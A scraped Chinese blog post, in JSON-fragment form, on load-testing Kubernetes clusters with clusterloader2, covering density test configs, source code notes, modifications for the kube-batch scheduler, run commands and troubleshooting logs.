","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:3:1","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"2. 测试配置文件 test config（默认） density 测试配置 Steps is the procedures you defined. Each step might contain phases, measurements Meansurement defines what you want to supervise or capture. Phase describes the attributes of some certain tasks. This config defines the following steps: Starting measurements : don’t care about what happens during preparation. Starting saturation pod measurements : same as above Creating saturation pods : the first case is saturation pods Collecting saturation pod measurements Starting latency pod measurements Creating latency pods : the second case is latency pods Waiting for latency pods to be running Deleting latency pods Waiting for latency pods to be deleted Collecting pod startup latency Deleting saturation pods Waiting for saturation pods to be deleted Collecting measurements So we can see the testing mainly gathers measurements during the CRUD of saturation pods and latency pods: saturation pods: pods in deployments with quite a large repliacas latency pods: pods in deployments with one replicas So you see the differences between the two modes. When saturation pods are created, replicas-controller in kube-controller-manager is handling one event. But in terms of latency pods, it’s hundreds of events. But what’s the difference anyway? It’s because the various rate-limiter inside kubernetes affects the performance of scheduler and controller-manager. In each case, what we’re concerned is the number of pods, deployments and namespaces. We all know that kubernetes limits the pods/node, pods/namespace, so it’s quite essential to adust relative parameters to achieve a reasonable load. test config.yaml（默认配置） # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).#Constants{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \"\"}}{{$NODE_MODE := DefaultParam .NODE_MODE \"allnodes\"}}{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 30}}{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 20}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 100}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 350}}{{$MIN_LATENCY_PODS := 500}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS true}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \"\"}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}{{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won't fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:qps:5{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MOD","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:3:2","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"3. clusterloader2 源码简析 解析测试配置信息，执行测试测试用例 clusterloader2/cmd/clusterloader.go void main(){ // 构造clusterLoaderConfig // 构造framework，即各种k8s client f, err := framework.NewFramework( \u0026clusterLoaderConfig.ClusterConfig, getClientsNumber(clusterLoaderConfig.ClusterConfig.Nodes), ) // 遍历测试配置文件（可多个），按配置用例运行测试 for _, clusterLoaderConfig.TestConfigPath = range testConfigPaths { test.RunTest(f, prometheusFramework, \u0026clusterLoaderConfig) } } // RunTest runs test based on provided test configuration. func RunTest(clusterFramework, prometheusFramework *framework.Framework, clusterLoaderConfig *config.ClusterLoaderConfig) *errors.ErrorList { // simpleContext上下文信息 ctx := CreateContext(clusterLoaderConfig, clusterFramework, prometheusFramework, state.NewState()) testConfigFilename := filepath.Base(clusterLoaderConfig.TestConfigPath) // 按参数 设置override config 和 nodes参数 mapping, errList := config.GetMapping(clusterLoaderConfig) if errList != nil { return errList } // 使用emplateProvider根据mapping信息把testConfig的模板文件渲染成可用的api.Config testConfig, err := ctx.GetTemplateProvider().TemplateToConfig(testConfigFilename, mapping) if err != nil { return errors.NewErrorList(fmt.Errorf(\"config reading error: %v\", err)) } return Test.ExecuteTest(ctx, testConfig) } // api.Config 定义 // Config is a structure that represents configuration // for a single test scenario. type Config struct { // Name of the test case. Name string `json: name` // AutomanagedNamespaces is a number of automanaged namespaces. AutomanagedNamespaces int32 `json: automanagedNamespaces` // Steps is a sequence of test steps executed in serial. Steps []Step `json: steps` // TuningSets is a collection of tuning sets that can be used by steps. TuningSets []TuningSet `json: tuningSets` // ChaosMonkey is a config for simulated component failures. ChaosMonkey ChaosMonkeyConfig `json: chaosMonkey` } RunTest 又调用了 ExecuteTest，示例代码如下： 循环steps，按顺序执行ExecuteStep // ExecuteTest executes test based on provided configuration. func (ste *simpleTestExecutor) ExecuteTest(ctx Context, conf *api.Config) { // auto set test namespace ctx.GetClusterFramework().SetAutomanagedNamespacePrefix(fmt.Sprintf(\"test-%s\", util.RandomDNS1123String(6))) // clear test resource defer cleanupResources(ctx) // create test namespace err = ctx.GetClusterFramework().CreateAutomanagedNamespaces(int(conf.AutomanagedNamespaces)) // 遍历steps，分步执行，如果某step出错stepErr，则退出。 for i := range conf.Steps { if stepErrList := ste.ExecuteStep(ctx, \u0026conf.Steps[i]); !stepErrList.IsEmpty() { errList.Concat(stepErrList) if isErrsCritical(stepErrList) { return errList } } } // 输出测试汇总信息 for _, summary := range ctx.GetMeasurementManager().GetSummaries() { if ctx.GetClusterLoaderConfig().ReportDir == \"\" { klog.Infof(\"%v: %v\", summary.SummaryName(), summary.SummaryContent()) } else { // TODO(krzysied): Remember to keep original filename style for backward compatibility. filePath := path.Join(ctx.GetClusterLoaderConfig().ReportDir, summary.SummaryName()+\"_\"+conf.Name+\"_\"+summary.SummaryTime().Format(time.RFC3339)+\".\"+summary.SummaryExt()) ioutil.WriteFile(filePath, []byte(summary.SummaryContent()), 0644) } } } 可以看出 每个step中的Measurements和Phases都是并发执行的。 而且在每个step中，要么执行measurement.exec，要么执行phase.exec clusterloader2/pkg/test/simple_test_executor.go // ExecuteStep executes single test step based on provided step configuration. func (ste *simpleTestExecutor) ExecuteStep(ctx Context, step *api.Step) *errors.ErrorList { var wg wait.Group errList := errors.NewErrorList() if len(step.Measurements) \u003e 0 { for i := range step.Measurements { // index is created to make i value unchangeable during thread execution. index := i wg.Start(func() { err := ctx.GetMeasurementManager().Execute(step.Measurements[index].Method, step.Measurements[index].Identifier, step.Measurements[index].Params) if err != nil { errList.Append(fmt.Errorf(\"measurement call %s - %s error: %v\", step.Measurements[index].Method, step.Measurements[index].Identifier, err)) } }) } } else { for i := range step.Phases {","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:3:3","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"4. 部署测试 .1 k8s-2节点环境 在本地虚拟机2节点的测试环境中，需要修改测试配置文件和pod部署脚本。 测试配置文件主要修改参数有 Nodes，属于配置文件上下文参数，如果不指定，测试工具会抓取实际环境中的可用的节点数，进行设置 NODES_PER_NAMESPACE， 每个ns下的nodes数。这里需注意: NODES \u003e NODES_PER_NAMESPACE PODS_PER_NODE，每个节点下的pod数 MIN_LATENCY_PODS这个数值会跟 PODS_PER_NODE比较 选取最大的，作为LATENCY测试的参数。因为LATENCY测试一般使用较多pod 数，即$MIN_LATENCY_PODS 测试中会有测试使用的资源参数，这里需要对实际情况进行config.yaml调整。 LATENCY_POD_CPU LATENCY_POD_MEMORY 其它自定义资源数量，可以在config.yaml或者rc.yaml和deployment文件中添加配置 .1 部署config.yaml 这里主要修改如下： 上述的测试配置参数 主要修改参数有 NODES_PER_NAMESPACE PODS_PER_NODE MIN_LATENCY_PODS LATENCY_POD_CPU LATENCY_POD_MEMORY DENSITY_TEST_THROUGHPUT measurement-TestMetrics 原有测试工具解析收集Metrics操作异常导致测试失败，详见后面问题描述 # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).#Constants{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \"\"}}#{{$NODE_MODE := DefaultParam .NODE_MODE \"allnodes\"}}{{$NODE_MODE := DefaultParam .NODE_MODE \"master\"}}{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 1}}{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 2}}{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 20}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 5}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 3}}{{$MIN_LATENCY_PODS := 20}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS false}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \"\"}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}{{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won't fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:qps:5{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}# Create saturation pods- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = saturationthreshold:{{$saturationRCTimeout}}s- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = saturationoperationTimeout:{{$saturationRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:1tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc.yamltemplateFillMap:Replicas:{{$podsPerNamespace}}Group:saturationCpuRequest:1mMemoryRequest:10M- measurements:- Identifier:SchedulingTh","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:3:4","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"4 对自定义调度器测试 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:4:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"源码修改 对自定义调度器kube-batch测试，pod延时的计算，原有代码使用的是k8s调度器的event，这里需要修改成kube-batch，如下 在pod_startup_latency.go中 func (p *podStartupLatencyMeasurement) gatherScheduleTimes(c clientset.Interface) error { // custom cheduler add by wangb const CustomSchedulerName = \"kube-batch\" selector := fields.Set{ \"involvedObject.kind\": \"Pod\", //\"source\": corev1.DefaultSchedulerName, \"source\": CustomSchedulerName, }.AsSelector().String() options := metav1.ListOptions{FieldSelector: selector} schedEvents, err := c.CoreV1().Events(p.namespace).List(options) if err != nil { return err } for _, event := range schedEvents.Items { key := createMetaNamespaceKey(event.InvolvedObject.Namespace, event.InvolvedObject.Name) if _, ok := p.createTimes[key]; ok { p.scheduleTimes[key] = event.FirstTimestamp } } return nil } 重新编译成 custom_clusterloader ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:4:1","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"配置文件 修改下test.config 和 rc.yaml test.config 中注意pod资源使用，适当调整大些 rc.yaml中，要对container同时设置limts和requests ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:4:2","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"custom_clusterloader运行命令 # 自定义clusterloader程序：custom_clusterloader cd /home/wangb/perf-test/clusterloader2 # ssh访问参数 export KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa # master节点信息 MASTER_NAME=node1 TEST_MASTER_IP=192.168.182.101 TEST_MASTER_INTERNAL_IP=192.168.182.101 KUBE_CONFIG=${HOME}/.kube/config # 测试配置文件 TEST_CONFIG='/home/wangb/perf-test/clusterloader2/testing/density/config-batch.yaml' # 测试报告目录位置 REPORT_DIR='./reports' # 测试日志打印文件 LOG_FILE='test.log' ./custom_clusterloader --kubeconfig=$KUBE_CONFIG \\ --mastername=$TEST_MASTER_IP \\ --masterip=$MASTER_IP \\ --master-internal-ip=TEST_MASTER_INTERNAL_IP \\ --testconfig=$TEST_CONFIG \\ --report-dir=$REPORT_DIR \\ --alsologtostderr 2\u003e\u00261 | tee $LOG_FILE ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:4:3","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"5 压力测试配置和执行脚本 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:5:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"1 benchmark测试 benchmark测试是测试k8s调度器性能和pod延时指标 config-benchmark.yaml # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).# cnofig-benchmark 测试标准k8s调度器和其它k8s标准组件性能#Constants# {{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \"\"}}# 根据100节点规模，使用100_nodes/constraints.yaml进行测试{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \"./100_nodes/constraints.yaml\"}}# {{$NODE_MODE := DefaultParam .NODE_MODE \"allnodes\"}}{{$NODE_MODE := DefaultParam .NODE_MODE \"master\"}}# 至少保证100个节点规模# 设置 NODES_PER_NAMESPACE 50，保证totalPods = 5000{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# 设置 NODES_PER_NAMESPACE 100，保证totalPods = 10000# {{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# PODS_PER_NODE 0 则禁用saturation{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 10}}# 并发数，目前aist 调度器 处理业务并发数20，会有阻塞。# DENSITY_TEST_THROUGHPUT 10 或 20 进行测试 注意跟下面tuningSets配置 qpsLoad: qps 保持一致{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 5}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.# {{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}# {{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 35}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 10}}# MIN_LATENCY_PODS为0，则禁用latency# {{$MIN_LATENCY_PODS := 0}}{{$MIN_LATENCY_PODS := 0}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS false}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \"\"}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}# 总pod数量：ns数量*每个ns的pod数（ PODS_PER_NODE * NODES_PER_NAMESPACE ）{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}# 如果 SATURATION, 设置 latencyReplicas = 0 则禁用latency# {{$latencyReplicas := 0}}# if latency set latency{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}# {{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$saturationRCTimeout := 3600}}{{$podsTimeout := DivideFloat $totalLatencyPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$latencyPodsTimeout := MaxInt $podsTimeout 7200}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won't fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711# 这里的超时 是wait_for_controlled_pods 时使用，一旦超过阈值，就会设置该pod为timeout# {{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 3600}}{{$latencyRCHardTimeout := MaxInt $latencyPodsTimeout 3600}}# add by binge# SchedulingThroughput 默认是在saturation中添加，自定义又在latency添加# 为避免调度器2个场景中的调度器吞吐量混淆，每次只统计一种场景下的调度器吞吐量SchedulingThroughput# 可以通过设置某场景的pod副本数为0方式，禁用该场景name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:# qps: 5# custom valueqps:{{$DENSITY_TEST_THROUGHPUT}}{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$EN","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:5:1","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"2 batch测试 batch测试是测试kube-batch调度器性能和pod延时指标 config-batch.yaml 测试kube-batch调度器的测试配置文件 # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).#Constants# {{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \"\"}}# 根据100节点规模，使用100_nodes/constraints.yaml进行测试{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \"./100_nodes/constraints.yaml\"}}# {{$NODE_MODE := DefaultParam .NODE_MODE \"allnodes\"}}{{$NODE_MODE := DefaultParam .NODE_MODE \"master\"}}# 至少保证100个节点规模# 设置 NODES_PER_NAMESPACE 50，保证totalPods = 5000{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# 设置 NODES_PER_NAMESPACE 100，保证totalPods = 10000# {{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}# PODS_PER_NODE 0 则禁用saturation{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 10}}# 并发数，目前aist 调度器 处理业务并发数20，会有阻塞。# DENSITY_TEST_THROUGHPUT 10 或 20 进行测试 注意跟下面tuningSets配置 qpsLoad: qps 保持一致{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 5}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.# {{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 10}}# {{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 35}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 10}}# MIN_LATENCY_PODS为0，则禁用latency# {{$MIN_LATENCY_PODS := 0}}{{$MIN_LATENCY_PODS := 0}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS false}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \"\"}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}# 总pod数量：ns数量*每个ns的pod数（ PODS_PER_NODE * NODES_PER_NAMESPACE ）{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}# 如果 SATURATION, 设置 latencyReplicas = 0 则禁用latency# {{$latencyReplicas := 0}}# if latency set latency{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}# {{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$saturationRCTimeout := 3600}}{{$podsTimeout := DivideFloat $totalLatencyPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}{{$latencyPodsTimeout := MaxInt $podsTimeout 7200}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won't fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711# 这里的超时 是wait_for_controlled_pods 时使用，一旦超过阈值，就会设置该pod为timeout# {{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 3600}}{{$latencyRCHardTimeout := MaxInt $latencyPodsTimeout 3600}}# add by binge# SchedulingThroughput 默认是在saturation中添加，自定义又在latency添加# 为避免调度器2个场景中的调度器吞吐量混淆，每次只统计一种场景下的调度器吞吐量SchedulingThroughput# 可以通过设置某场景的pod副本数为0方式，禁用该场景name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:# qps: 5# custom valueqps:{{$DENSITY_TEST_THROUGHPUT}}{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:5:2","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"6 问题 ","date":"2020-12-15","objectID":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/:6:0","tags":["K8S"],"title":"K8S集群性能测试-clusterloader","uri":"/posts/2020/12/k8s%E9%9B%86%E7%BE%A4%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95-clusterloader/"},{"categories":["K8S"],"content":"1. 提示 Getting master name error: master node not found和 Getting master internal ip error: didn’t find any InternalIP master IPs mastername和 internalip 参数需要配置 I1211 11:10:31.302599 118141 clusterloader.go:105] ClusterConfig.Nodes set to 2 E1211 11:10:31.304485 118141 clusterloader.go:113] Getting master name error: master node not found E1211 11:10:31.307705 118141 clusterloader.go:122] Getting master external ip error: didn't find any ExternalIP master IPs E1211 11:10:31.309369 118141 clusterloader.go:131] Getting master internal ip error: didn't find any InternalIP master IPs I1211 11:10:31.309388 118141 clusterloader.go:206] Using config: {ClusterConfig:{KubeConfigPath:/root/.kube/config Nodes:2 Provider: MasterIPs:[] MasterInternalIPs:[] MasterName: KubemarkRootKubeConfigPath:} ReportDir:./reports EnablePrometheusServer:false TearDownPrometheusServer:false TestConfigPath: 